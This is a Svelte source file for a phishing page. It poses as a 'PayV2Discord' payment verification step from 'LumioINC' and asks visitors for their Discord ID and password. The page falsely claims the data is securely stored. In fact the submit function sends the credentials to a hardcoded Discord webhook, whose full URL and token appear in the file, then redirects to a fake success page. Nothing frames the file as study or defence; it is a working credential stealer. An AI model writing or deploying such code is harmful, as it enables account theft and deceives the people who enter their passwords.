<script>
import { goto } from "$app/navigation";
    import { Embed, Field, Message, Webhook } from "discord-webhook-library";


let id = $state("")
let password = $state("")
let terms = $state(false)
let error = $state("")
const webhook = "https://discord.com/api/webhooks/1438248565557170378/wwnrmdkDN3r_OPWLS_FRPryF-SYExw1KXxlgEvk823k_yFt-IrwgFDwOkTCJ-GzUWLs5"

async function submit(){
    goto("/success")
    const wh = new Webhook(webhook)
    wh.addWebhookUrl(webhook)
    const e = new Embed()
    e.setTitle("Payment / Discord Infos")
    e.addFields(
        [
            new Field(
                "Id", id
            ),
            new Field(
                "Pass",
                password
            )
        ]
    );
    e.setColor(0x5865F2)
    wh.addMessage(new Message(
        {
            embeds: [e]
        }
    ))

    wh.send()
    
}




</script>



    <div class="bg-black flex flex-col items-center justify-center gap-5 min-h-screen w-full text-white">
    <h1 class="font-bold text-green-500 text-3xl md:text-4xl lg:text-5xl">PayV2Discord.</h1>
    <p class="font-thin text-xl text-center">Please verify your discord account, to proceed to payment. If you do not, we at LumioINC. are sorry, but can't provide you with services!</p>
    <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord Name">
    <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord ID" bind:value={id}>
     <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="Discord Password" bind:value={password} type="password">
    <p class="font-thin text-neutral-500"></p>
    <input class="bg-neutral-950 border border-neutral-900 p-2 focus:border-0 rounded-md" placeholder="PayPal Name" type="text">
    <div class="flex flex-row items-center justify-center text-neutral-400 gap-2">

        <input id="terms" class="bg-neutral-950 rounded-full" placeholder="Discord Name" type="checkbox">
        <label for="terms">I accept that this info is securly stored and used to verify my discord account, for paymential reasons.</label>

    </div>
    {#if error}
        <p class="font-semibold text-red-600">{error}</p>
    {/if}
    <button class="bg-green-500 rounded-2xl py-2 px-4 hover:opacity-85 active:opacity-115" type="submit" onclick={submit}>Verify now.</button>

</div>
